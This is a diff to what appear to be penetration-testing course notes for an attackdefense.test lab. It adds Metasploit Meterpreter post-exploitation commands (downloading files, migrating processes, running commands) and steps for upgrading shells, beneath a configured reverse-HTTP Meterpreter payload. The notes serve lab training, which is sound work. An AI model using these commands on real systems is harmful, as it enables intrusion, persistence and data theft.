@@ -476,3 +476,35 @@ set email_to root@attackdefense.test
 set payload linux/x64/meterpreter_reverse_http
 set LHOST eth1
 ```
+
+## Exploitation
+### Post exploitation fundamentals
+**Meterpreter fundamentals**
+```
+getuid
+background
+sessions -h
+
+edit flag2
+download flag5.zip
+checksum md5 /bin/bash
+getenv PATH
+search -d /usr/bin -f *backdoor*
+search -f *.jpg
+
+cmd
+
+ps
+migrate 123
+
+execute -f ifconfig
+```
+
+**Upgrading command shells to meterpreter shells**
+```
+search shell_to_meterpreter
+set SESSION 1
+set LHOST eth1
+
+sessions -u 1
+```
